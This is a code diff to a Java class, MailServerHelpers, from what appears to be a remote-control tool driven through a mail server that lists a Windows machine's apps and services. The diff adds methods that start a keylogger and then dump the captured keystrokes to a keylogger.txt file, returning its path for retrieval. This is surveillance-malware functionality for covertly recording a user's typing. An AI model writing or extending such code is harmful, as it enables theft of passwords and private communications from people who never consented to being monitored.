@@ -11,7 +11,6 @@ import java.util.List;
 
 public class MailServerHelpers {
     private static String fileAddress = Paths.get("").toAbsolutePath().toString() + "/";
-    private static Path filePathChecker = Paths.get(fileAddress);
 
     public static String getAppsList() {
         List<String> apps = new ArrayList<>();
@@ -42,7 +41,7 @@ public class MailServerHelpers {
     public static String getServicesList() {
         List<String> services = new ArrayList<>();
         try {
-            // Get apps
+            // Get services
             Process p = Runtime.getRuntime().exec("sc query type= service state= all");
             BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
 
@@ -164,6 +163,35 @@ public class MailServerHelpers {
         } catch (Exception e) {
             e.printStackTrace();
             return "Fail to stop previous shutdown attempts.";
+        }
+    }
+
+    public static String startKeylogger() {
+        try {
+            MailServerKeylogger.getInstance().startKeylogger();
+            return "Successfully start a keylogger.";
+        } catch (Exception e) {
+            e.printStackTrace();
+            return "Fail to start a keylogger";
+        }
+    }
+
+    public static String stopKeylogger() {
+        try {
+            List<String> keylogger = MailServerKeylogger.getInstance().getKeyloggerResult();
+
+            // Write to File
+            String fileAddressKeylogger = fileAddress + "/keylogger.txt";
+            FileWriter writer = new FileWriter(fileAddressKeylogger);
+            for(String str: keylogger) {
+                writer.write(str + System.lineSeparator());
+            }
+            writer.close();
+            return fileAddressKeylogger;
+
+        } catch (Exception e) {
+            e.printStackTrace();
+            return "";
         }
     }
 
